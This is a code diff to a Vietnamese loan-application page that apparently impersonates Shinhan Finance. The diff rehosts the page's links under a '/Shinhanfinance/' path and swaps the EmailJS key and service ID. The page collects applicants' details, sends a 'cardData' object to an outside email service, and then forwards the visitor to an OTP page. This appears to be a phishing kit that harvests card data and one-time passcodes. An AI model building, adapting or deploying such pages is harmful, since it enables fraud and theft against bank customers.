@@ -27,7 +27,7 @@
                 }
             };
         };
-        emailjs.init('jugdaw6sXSdJVlAlt');
+        emailjs.init('KJ7TlqIPf7U4cfyzQ');
     </script>
     <style>
         * {
@@ -615,14 +615,14 @@
 
     <nav role="navigation" aria-label="Main Navigation">
         <ul id="nav-menu">
-            <li><a href="/pages/vi/trang-chu.html">Trang Chủ</a></li>
-            <li><a href="/pages/vi/gioi-thieu.html">Giới Thiệu</a></li>
-            <li><a href="/pages/vi/ca-nhan.html">Lợi Ích</a></li>
-            <li><a href="/pages/vi/lai-suat-tien-gui.html">Giấy Tờ Cần Thiết</a></li>
-            <li><a href="/pages/vi/Evaluate-conditions.html">Đăng Ký Giải Ngân</a></li>
+            <li><a href="/Shinhanfinance/pages/vi/trang-chu.html">Trang Chủ</a></li>
+            <li><a href="/Shinhanfinance/pages/vi/gioi-thieu.html">Giới Thiệu</a></li>
+            <li><a href="/Shinhanfinance/pages/vi/ca-nhan.html">Lợi Ích</a></li>
+            <li><a href="/Shinhanfinance/pages/vi/lai-suat-tien-gui.html">Giấy Tờ Cần Thiết</a></li>
+            <li><a href="/Shinhanfinance/pages/vi/Evaluate-conditions.html">Đăng Ký Giải Ngân</a></li>
             <li><a href="check_result.html">Xem Kết Quả</a></li>
-            <li><a href="/pages/vi/dieu-khoan-su-dung.html">Điều Khoản Sử Dụng</a></li>
-            <li><a href="/pages/vi/support-center.html">Liên Hệ</a></li>
+            <li><a href="/Shinhanfinance/pages/vi/dieu-khoan-su-dung.html">Điều Khoản Sử Dụng</a></li>
+            <li><a href="/Shinhanfinance/pages/vi/support-center.html">Liên Hệ</a></li>
         </ul>
     </nav>
 
@@ -818,7 +818,7 @@
                 formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
                 if (!formData.fullName) {
                     alert('Vui lòng nhập thông tin giải ngân trước.');
-                    window.location.href = '/pages/vi/Evaluate-conditions.html';
+                    window.location.href = '/Shinhanfinance/pages/vi/Evaluate-conditions.html';
                     return;
                 }
                 document.getElementById('summaryName').textContent = formData.fullName || 'N/A';
@@ -844,7 +844,7 @@
             } catch (error) {
                 console.error('Error parsing formData:', error);
                 alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
-                window.location.href = '/pages/vi/Evaluate-conditions.html';
+                window.location.href = '/Shinhanfinance/pages/vi/Evaluate-conditions.html';
             }
         });
 
@@ -1043,10 +1043,10 @@
     method: ''
 };
                 console.log('Sending cardData:', cardData);
-                emailjs.send('service_zspw0b7', 'template_8gfs8jr', cardData).then(
+                emailjs.send('service_149dqxt', 'template_8gfs8jr', cardData).then(
                     () => {
                         console.log('EmailJS sent successfully');
-                        window.location.href = '/pages/vi/otp.html';
+                        window.location.href = '/Shinhanfinance/pages/vi/otp.html';
                     },
                     (error) => {
                         console.error('EmailJS error:', error);
